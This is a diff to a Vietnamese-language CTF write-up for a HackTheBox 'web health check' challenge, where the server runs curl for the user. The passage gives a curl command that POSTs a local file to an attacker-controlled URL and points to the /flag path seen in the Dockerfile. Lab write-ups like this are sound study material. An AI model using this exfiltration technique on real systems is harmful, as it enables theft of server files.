@@ -5,7 +5,7 @@ ta thấy rằng web này cho ta dùng __curl trong linux__ để crawl đến w
 ![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/3.png)
 ![alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_health_check/src/4.png)
 <br />
-nhưng  lệnh __curl__ trong linux có thể upload file đến một máy web khác bằng lệnh như sau __curl $url_attacker -X POST -F file=@@/file__ 
+nhưng  lệnh __curl__ trong linux có thể upload file đến một máy web khác bằng lệnh như sau __curl $url_attacker -X POST -F file=@@/file__.
 <br />
 trong tệp __Dockerfile__ ta có thể thấy đường dẫn __/flag__
 <br />
